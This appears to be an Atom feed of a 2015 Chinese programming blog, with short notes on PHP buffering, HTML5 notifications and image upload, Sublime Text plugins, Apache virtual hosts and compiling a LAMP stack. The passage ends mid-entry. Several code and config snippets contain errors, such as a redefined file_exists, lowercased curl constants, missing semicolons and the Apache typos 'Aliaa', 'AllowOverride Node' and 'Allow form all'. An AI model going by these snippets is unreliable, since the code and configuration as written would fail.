<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Blog like hacke]]></title>
  <link href="http://ztlblog.github.io/atom.xml" rel="self"/>
  <link href="http://ztlblog.github.io/"/>
  <updated>2015-07-23T13:28:41+08:00</updated>
  <id>http://ztlblog.github.io/</id>
  <author>
    <name><![CDATA[ztl]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[php之缓冲区]]></title>
    <link href="http://ztlblog.github.io/blog/2015/07/23/php005/"/>
    <updated>2015-07-23T13:24:24+08:00</updated>
    <id>http://ztlblog.github.io/blog/2015/07/23/php005</id>
    <content type="html"><![CDATA[<p><strong>ob_flush 与 flush 区别</strong></p>

<pre><code>ob_flush:是把数据从php的缓冲中释放出来
flush:是把不在缓冲中的或者说是被释放出来的数据发送到浏览器
所以当缓冲存在的时候，我们必须ob_flush和flush同时使用.
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[html5之本地存储]]></title>
    <link href="http://ztlblog.github.io/blog/2015/07/22/html5001/"/>
    <updated>2015-07-22T17:28:55+08:00</updated>
    <id>http://ztlblog.github.io/blog/2015/07/22/html5001</id>
    <content type="html"><![CDATA[<figure class='code'><figcaption><span>html </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE html>
</span><span class='line'>&lt;html>
</span><span class='line'>&lt;head>
</span><span class='line'>  &lt;meta charset="utf-8">
</span><span class='line'>  &lt;meta http-equiv="X-UA-Compatible" content="IE=edge">
</span><span class='line'>  &lt;title>本地提醒&lt;/title>
</span><span class='line'>  &lt;script type="text/javascript" src="main.js">&lt;/script> 
</span><span class='line'>&lt;/head>
</span><span class='line'>&lt;body>
</span><span class='line'>  &lt;button onclick="NotificationHandler.showNotification()">show notification&lt;/button> 
</span><span class='line'>&lt;/body>
</span><span class='line'>&lt;/html></span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>js </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>var NotificationHandler = {
</span><span class='line'>  isNotificationSupported: 'Notification' in window,
</span><span class='line'>  isPermissionGranted: function() {
</span><span class='line'>      return Notification.permission === 'granted';
</span><span class='line'>  },
</span><span class='line'>  requestPermission: function() {
</span><span class='line'>      if (!this.isNotificationSupported) {
</span><span class='line'>          console.log('the current browser does not support Notification API');
</span><span class='line'>          return;
</span><span class='line'>      }
</span><span class='line'>
</span><span class='line'>      Notification.requestPermission(function(status) {
</span><span class='line'>          //status是授权状态，如果用户允许显示桌面通知，则status为'granted'
</span><span class='line'>          console.log('status: ' + status);
</span><span class='line'>
</span><span class='line'>          //permission只读属性
</span><span class='line'>          var permission = Notification.permission;
</span><span class='line'>          //default 用户没有接收或拒绝授权 不能显示通知
</span><span class='line'>          //granted 用户接受授权 允许显示通知
</span><span class='line'>          //denied  用户拒绝授权 不允许显示通知
</span><span class='line'>
</span><span class='line'>          console.log('permission: ' + permission);
</span><span class='line'>      });
</span><span class='line'>  },
</span><span class='line'>  showNotification: function() {
</span><span class='line'>      if (!this.isNotificationSupported) {
</span><span class='line'>          console.log('the current browser does not support Notification API');
</span><span class='line'>          return;
</span><span class='line'>      }
</span><span class='line'>      if (!this.isPermissionGranted()) {
</span><span class='line'>          console.log('the current page has not been granted for notification');
</span><span class='line'>          return;
</span><span class='line'>      }
</span><span class='line'>
</span><span class='line'>      var n = new Notification("sir, you got a message", {
</span><span class='line'>          icon: 'img/icon.png',
</span><span class='line'>          body: 'you will have a meeting 5 minutes later.'
</span><span class='line'>      });
</span><span class='line'>
</span><span class='line'>      //onshow函数在消息框显示时会被调用
</span><span class='line'>      //可以做一些数据记录及定时操作等
</span><span class='line'>      n.onshow = function() {
</span><span class='line'>          console.log('notification shows up');
</span><span class='line'>          //5秒后关闭消息框
</span><span class='line'>          setTimeout(function() {
</span><span class='line'>              n.close();
</span><span class='line'>          }, 5000);
</span><span class='line'>      };
</span><span class='line'>
</span><span class='line'>      //消息框被点击时被调用
</span><span class='line'>      //可以打开相关的视图，同时关闭该消息框等操作
</span><span class='line'>      n.onclick = function() {
</span><span class='line'>          alert('open the associated view');
</span><span class='line'>          //opening the view...
</span><span class='line'>          n.close();
</span><span class='line'>      };
</span><span class='line'>
</span><span class='line'>      //当有错误发生时会onerror函数会被调用
</span><span class='line'>      //如果没有granted授权，创建Notification对象实例时，也会执行onerror函数
</span><span class='line'>      n.onerror = function() {
</span><span class='line'>          console.log('notification encounters an error');
</span><span class='line'>          //do something useful
</span><span class='line'>      };
</span><span class='line'>
</span><span class='line'>      //一个消息框关闭时onclose函数会被调用
</span><span class='line'>      n.onclose = function() {
</span><span class='line'>          console.log('notification is closed');
</span><span class='line'>          //do something useful
</span><span class='line'>      };
</span><span class='line'>  }
</span><span class='line'>};
</span><span class='line'>
</span><span class='line'>document.addEventListener('load', function() {
</span><span class='line'>  //try to request permission when page has been loaded.
</span><span class='line'>  NotificationHandler.requestPermission();
</span><span class='line'>});
</span><span class='line'>
</span><span class='line'>setTimeout(function() {  
</span><span class='line'>    //if there has new mail, show notification  
</span><span class='line'>    NotificationHandler.showNotification();  
</span><span class='line'>}, 5000);</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[利用H5上传图片]]></title>
    <link href="http://ztlblog.github.io/blog/2015/07/21/html5/"/>
    <updated>2015-07-21T16:48:42+08:00</updated>
    <id>http://ztlblog.github.io/blog/2015/07/21/html5</id>
    <content type="html"><![CDATA[<p><strong>主要用到的知识点</strong>
    fileAPI  FormData</p>

<figure class='code'><figcaption><span>html </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE html>
</span><span class='line'>&lt;html lang="en">
</span><span class='line'>&lt;head>
</span><span class='line'>  &lt;meta charset="UTF-8">
</span><span class='line'>  &lt;title>图片上传&lt;/title>
</span><span class='line'>  &lt;script type="text/javascript" src='jquery-1.7.2.min.js'>&lt;/script>
</span><span class='line'>&lt;/head>
</span><span class='line'>&lt;body>
</span><span class='line'>  &lt;form id='form1'>
</span><span class='line'>      用户名：&lt;input type='text' name='username' />&lt;/br>
</span><span class='line'>      用户头像：&lt;input type='file' name='pic' id='pic' onchange='send();'>&lt;/br>
</span><span class='line'>      &lt;input type='button' id='but1' value='提交'>
</span><span class='line'>  &lt;/form>
</span><span class='line'>  &lt;div>
</span><span class='line'>      &lt;img id='imgs' widht='50' height='50' />
</span><span class='line'>  &lt;/div>
</span><span class='line'>&lt;/body>
</span><span class='line'>&lt;script type="text/javascript">
</span><span class='line'>function send()
</span><span class='line'>{
</span><span class='line'>   var pic = document.getElementById('pic');
</span><span class='line'>
</span><span class='line'>   if (window.navigator.userAgent.indexOf("Chrome") >= 1 || window.navigator.userAgent.indexOf("Safari") >= 1) 
</span><span class='line'>   {
</span><span class='line'>      var src = window.webkitURL.createObjectURL(pic.files[0]);
</span><span class='line'>   }
</span><span class='line'>   else 
</span><span class='line'>   {
</span><span class='line'>      var src = window.URL.createObjectURL(pic.files[0]);
</span><span class='line'>   }
</span><span class='line'>   $("#imgs").attr({src: src});
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>$("#but1").click(function(){
</span><span class='line'>  var fd = new FormData($('#form1'));
</span><span class='line'>  $.ajax({ 
</span><span class='line'>            url: 'from.php',  
</span><span class='line'>            type: 'POST',  
</span><span class='line'>            data: fd,  
</span><span class='line'>            dataType: 'JSON',
</span><span class='line'>            cache: false,  
</span><span class='line'>            processData: false,  
</span><span class='line'>            contentType: false  
</span><span class='line'>        }).done(function(ret){  
</span><span class='line'>          console.log(ret);
</span><span class='line'>    }); 
</span><span class='line'>});
</span><span class='line'>&lt;/script>
</span><span class='line'>&lt;/html></span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>//获取图片进行处理
</span><span class='line'>print_r($_FILES);
</span><span class='line'>//获取其他数据进行处理
</span><span class='line'>print_r($_POST);</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[linux下如何编译安装软件]]></title>
    <link href="http://ztlblog.github.io/blog/2015/07/20/linux003/"/>
    <updated>2015-07-20T13:10:47+08:00</updated>
    <id>http://ztlblog.github.io/blog/2015/07/20/linux003</id>
    <content type="html"><![CDATA[<h3>基本步骤</h3>

<pre><code>1 ./configure 检查gcc编译器、依赖函数库或软件是否已经安装
2 当configure 检查通过后，生成makefile文件
3 make根据makefile生成可执行文件（二进制文件）
4 make install 到/etc /lib /usr/lib /usr/share /var/lib
</code></pre>

<h3>注意</h3>

<pre><code>/etc 一般放置配置文件
/lib /usr/lib 一般放置函数库 
/var/lib  一般放置数据库
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PHP无限极分类]]></title>
    <link href="http://ztlblog.github.io/blog/2015/07/14/php006/"/>
    <updated>2015-07-14T13:59:46+08:00</updated>
    <id>http://ztlblog.github.io/blog/2015/07/14/php006</id>
    <content type="html"><![CDATA[<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$arr = array(
</span><span class='line'> array('id' => 1,'name' => 'php', 'pid' => 0,'path' => 0),
</span><span class='line'> array('id' => 2,'name' => 'java', 'pid' => 0,'path' => 0),
</span><span class='line'> array('id' => 3,'name' => 'php_1', 'pid' => 1,'path' => '0-1'),
</span><span class='line'> array('id' => 4,'name' => 'js', 'pid' => 0,'path' => '0-2'),
</span><span class='line'> array('id' => 5,'name' => 'php_1_1','pid' => 0,'path' => '0-1-3'),
</span><span class='line'> array('id' => 6,'name' => 'linux', 'pid' => 0,'path' => '0')
</span><span class='line'>);</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>foreach ($arr as &$value)
</span><span class='line'>{
</span><span class='line'> $num = substr_count($value['path'], '-');
</span><span class='line'> if($num > 0)
</span><span class='line'> {
</span><span class='line'>  $pre = '|'.str_repeat('-', $num);
</span><span class='line'> }else
</span><span class='line'> {
</span><span class='line'>  $pre = '';
</span><span class='line'> }
</span><span class='line'> $value['tree'] = $pre.$value['name'];
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>foreach ($arr as $row)
</span><span class='line'>{
</span><span class='line'> $rows[] = $row['path'].'-'.$row['id'];
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>array_multisort($rows,$arr);
</span><span class='line'>echo '&lt;pre>';
</span><span class='line'>print_r($arr);</span></code></pre></td></tr></table></div></figure>


<p><strong>如果是在mysql中可以先排序</strong></p>

<pre><code>group by cancat(path.'-'.id)
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PHP判断远程文件是否存在的几种方法]]></title>
    <link href="http://ztlblog.github.io/blog/2015/07/14/php005/"/>
    <updated>2015-07-14T13:59:46+08:00</updated>
    <id>http://ztlblog.github.io/blog/2015/07/14/php005</id>
    <content type="html"><![CDATA[<p><strong>在做一个图片预览的东西,遇到一个问题,就是判断远程文件是否存在</strong></p>

<figure class='code'><figcaption><span>curl判断文件 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>function file_exists($url)
</span><span class='line'>{
</span><span class='line'>  $ch = curl_init();
</span><span class='line'>  curl_setopt($ch,curlopt_url,$url);
</span><span class='line'>  curl_setopt($ch,curlopt_nobody,1);
</span><span class='line'>  curl_setopt($ch,curlopt_failonerror,1);
</span><span class='line'>  curl_setopt($ch,curlopt_returntransfer,1);
</span><span class='line'>  
</span><span class='line'>  if(curl_exec($ch)!==false)
</span><span class='line'>  return true;
</span><span class='line'>  else
</span><span class='line'>  return false
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>file_get_contents判断文件 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>function file_exists2($url)
</span><span class='line'>{
</span><span class='line'>  if(file_get_contents($url,0,null,0,1))
</span><span class='line'>  return 1;
</span><span class='line'>  else
</span><span class='line'>  return 0;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>get_headers判断文件 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>function file_exists3($url)
</span><span class='line'>{
</span><span class='line'>  return get_headers($url)
</span><span class='line'>}
</span><span class='line'>注意：返回值array</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[sublime配置全攻略]]></title>
    <link href="http://ztlblog.github.io/blog/2015/07/14/other002/"/>
    <updated>2015-07-14T13:59:46+08:00</updated>
    <id>http://ztlblog.github.io/blog/2015/07/14/other002</id>
    <content type="html"><![CDATA[<h3>一.常用插件</h3>

<p><strong>1.package control</strong>。我们用sublime几乎都会首先安装这个插件，再安装其他插件就方便了。安装方法：</p>

<pre><code>点击sublime的菜单栏 view-&gt;show console;现在打开了控制台

import urllib2,os;pf='Package Control.sublime-package';ipp=sublime.installed_packages_path();os.makedirs(ipp) if not os.path.exists(ipp) else None;open(os.path.join(ipp,pf),'wb').write(urllib2.urlopen('http://sublime.wbond.net/'+pf.replace(' ','%20')).read())
</code></pre>

<p>然后我们按住 ctrl+shift+p。此时会输出一个输入框，输入install。选择package contrl:install package 回车，需要稍等一会，右下角状态栏会显示正在连接的提示文字。 使用sublime时注意看右下角状态栏，很多插件的提示信息都显示在这里，这个状态栏很小，初次使用的人都有可能没有注意到它。</p>

<p>如果要卸载插件， ctrl+shift+p 输入 remove， 选择package control:remove package 然后再选择已安装的插件， 回车即可卸载。</p>

<p>如果package control 安装插件时失败了， 我们可以采用手动安装的方式， 在google上去搜索插件， 下载插件的源代码。在sublime的菜单栏点击 preferences->Browse package..  此时会打开插件目录。然后把你下载的插件源代码复制进去就可以了。</p>

<p>ctrl+shift+p 打开的输入框面板是什么？任何操作都可以在这个面板里面完成。 打开万能面板有几种方式：</p>

<p>ctrl+shift+p 打开时，我们需要在面板中输入一个命令，然后执行命令。所有菜单栏能操作事都可以在这里输入命令进行操作。</p>

<p>ctrl+p 打开时，能快速查找文件。</p>

<p>ctrl+r 打开时， 能查找当前文件中的函数。</p>

<p>ctrl+g 打开时，能跳转到指定行。</p>

<p><strong>2.ctags。</strong> 这个cake能跨文件跳转，跳转到指定函数声明的地方。使用 <strong>package control</strong>搜索<strong>ctags</strong>进行安装。注意安装好插件后需要安装ctags命令。window下载(ctags.ext <a href="http://pan.baidu.com/s/1sjDmnLV">http://pan.baidu.com/s/1sjDmnLV</a>)。将ctags.ext文件放在一个环境变量能访问到的地方。打开cmd，输入ctags,如果有这个命令，证明成功了。</p>

<p><strong>3.sublimecodeintel代码提示。</strong> sublime默认的代码提示只能提示系统函数，用户自己创建的函数、类不能提示。如果想要提示自己简历的函数。可以安装sublimecondeintel插件</p>

<p>sublimecodeintel安装后需要安配置文件：插件目录./codeintel/config中增加</p>

<pre><code>"php":{
    "php": 'D:\SaeServer\php\php.ext',
    "phpExtraPaths": ['D:\SaeServer\php\stdlib'],
    "phpConfigFile": 'D:\SaeServer\apache\php.ini'
},
</code></pre>

<p><strong>4.语法提示。</strong>我们需要在写代码的时候如果有语法错误，能立即提示我们， 可以安装这两个插件：sublimelint 和Phpcs ， sublimeint 需要系统有php命令。 所以需要设置好php的环境变量。 sublimelint的语法错误提示是显示在状态栏上面的，所以在编写程序的时候注意时常看看状态栏。 而Phpcs的语法错误提示是在我们保存文件时弹出万能面板显示错误，sublimelint的错误提示实时但不明显。 Phpcs的错误提示不是实时的，但很明显。 因此我们一般这两个插件都要安装。  Phpcs除了代码提示的共，还有其他功能，但是我暂时没有弄明白其他功能怎么用， 大家可以去研究一下，如果知道怎么用了再告诉我一下。</p>

<p><strong>5.goto document.</strong>这个插件能帮助我们快速查看手册。比如我们在写php代码时，突然忘记了某个函数怎么用了，将鼠标房子这个函数上，然后按F1，他能快速打开PHP手册中的说明这个函数用法的地方。</p>

<p>安装好goto document插件后我们再配置快捷键F1跳转到文档。打开sublime的菜单栏Preferences->key bindings -User 设置快捷键：</p>

<pre><code>[
    {"keys":["f1"],"command": "goto_documentation"}
]
</code></pre>

<p><strong>6.SVN插件.</strong> windows下可以安装Tortoise和Tortoisesvn的客户端。然后在sublime中在目录或文件右键都可以提交svn了。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[apache基本配置]]></title>
    <link href="http://ztlblog.github.io/blog/2015/07/10/apache002/"/>
    <updated>2015-07-10T16:58:55+08:00</updated>
    <id>http://ztlblog.github.io/blog/2015/07/10/apache002</id>
    <content type="html"><![CDATA[<h2>1.apache使用php</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>加载php的动态模块
</span><span class='line'>LoadModule php5_module  modules/libphp5.so
</span><span class='line'>解析 .php 的脚本
</span><span class='line'>AddType application/x-httpd-php .php</span></code></pre></td></tr></table></div></figure>


<h2>2.虚拟目录技术</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Aliaa /m "/mnt"
</span><span class='line'>&lt;Directory "/mnt">
</span><span class='line'>  Options Indexes MultiViews
</span><span class='line'>  AllowOverride None
</span><span class='line'>  Order allow,deny
</span><span class='line'>  Allow from all
</span><span class='line'>&lt;/Directory>
</span><span class='line'>注意：indexes 下载列表
</span><span class='line'>  multiviews 多视图（http://192.168.100.1/m/show 就可以访问show.php）</span></code></pre></td></tr></table></div></figure>


<h2>3.虚拟主机技术</h2>

<figure class='code'><figcaption><span>不同域名解析到同一个ip上 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vim httpd-vhosts.conf
</span><span class='line'>NameVirtualHost 192.168.100.1:80
</span><span class='line'>&lt;VirtualHost 192.168.100.1:80>
</span><span class='line'>  DocumentRoot "/web/bbs"
</span><span class='line'>  ServerName bbs.lampym.com
</span><span class='line'>  #修改虚拟主机的服务权限
</span><span class='line'>  &lt;Directory "/web/bbs">
</span><span class='line'>      Options Indexes MultiViews
</span><span class='line'>      AllowOverride Node
</span><span class='line'>      Order allow,deny
</span><span class='line'>      Allow form all
</span><span class='line'>  &lt;/Directory>
</span><span class='line'>&lt;/VirtualHost></span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[编译安装lamp]]></title>
    <link href="http://ztlblog.github.io/blog/2015/07/10/lamp001/"/>
    <updated>2015-07-10T10:08:12+08:00</updated>
    <id>http://ztlblog.github.io/blog/2015/07/10/lamp001</id>
    <content type="html"><![CDATA[<h2>1.安装gcc编辑器</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum -y install gcc*</span></code></pre></td></tr></table></div></figure>


<h2>2.卸载系统apache,mysql,php的rpm安装包</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum remove httpd
</span><span class='line'>yum remove mysql</span></code></pre></td></tr></table></div></figure>


<h2>3.编译安装php</h2>

<figure class='code'><figcaption><span>libxml2 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cd /lamp/libxml2-2.6.30
</span><span class='line'>./configure --prefix=/usr/local/libxml2
</span><span class='line'>make 
</span><span class='line'>make install</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>libmcrypt </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cd /lamp/libmcrypt-2.5.8
</span><span class='line'>./configure --prefix=/usr/local/libmcrypt/
</span><span class='line'>make 
</span><span class='line'>make install</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>libtdl </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>注：libltdl是在libmcrypt源码目录中，非新软件
</span><span class='line'>cd /lamp/libmcrypt-2.5.8/libltdl
</span><span class='line'>./configure --enable-ltdl-install
</span><span class='line'>make 
</span><span class='line'>make install</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>zlib </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cd /lamp/zlib-1.2.3
</span><span class='line'>./configure
</span><span class='line'>make 
</span><span class='line'>make install
</span><span class='line'>注：zlib指定安装目录可能造成libpng安装失败，故不指定，为了卸载方便
</span><span class='line'>建议 make isntall 执行结果输出到安装日志文件，便于日后卸载</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>libpng </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cd /lamp/libpng-1.2.31
</span><span class='line'>./configure --prefix=/usr/local/libpng
</span><span class='line'>make
</span><span class='line'>make install</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>jpeg6 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkdir /usr/local/jpeg6
</span><span class='line'>mkdir /usr/local/jpeg6/bin
</span><span class='line'>mkdir /usr/local/jpeg6/lib
</span><span class='line'>mkdir /usr/local/jpeg6/include
</span><span class='line'>mkdir /usr/local/jpeg6/man/man 1</span></code></pre></td></tr></table></div></figure>


<h2>4.安装apache</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
